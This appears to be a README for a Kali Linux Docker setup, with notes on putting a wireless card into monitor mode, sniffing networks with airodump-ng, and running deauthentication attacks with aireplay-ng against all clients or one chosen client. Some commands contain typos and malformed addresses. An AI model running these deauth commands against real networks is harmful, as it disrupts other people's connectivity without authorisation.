# Kali on Docker

Simple dockerfile to bring up Kali linux.

It can be run like the following
```
docker build -t mykali .
docker run -it --net="host" --privileged mykali bash
```

`--privileged` is needed to have access to the wireless card.

Dependencies: man-db exploitdb 

## Network
### Monitor Mode
`airmon-ng start wlp0s29u1u4` will switch wiless card to **monitor** mode. `stop` will put it back to **managed** mode. Look at `ifconfig` or `iwconfig` to check the current mode and name.

You can also use `iwconfig` to switch the mode:
```
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
service network-manager restart ## (distro dependent)

```

#### Dependencies
ps-watcher, kmod, pciutils

### Network Sniffing
`airodump-ng wlan0mon` in monitor mode will allow you to watch networks and see their interface names.

Choose a channel that is uncommon for a better connection. More effective connection. Learn about one router: `airodumb-ng -channel 9 -bssid 40:30:30:40 -write testmon0 wlan0`

#### Deauthentication attacks
This sends "DeAuth" packets.
`aireplay-ng --deauth 1000 -a 10:20:20:10 wlan0` ## all clients

`aireplay-ng --deauth 1000 -a 10:20:20:10 -c 00:AA:BB:CC wlan0` ## specific target

### Wireless Attacks



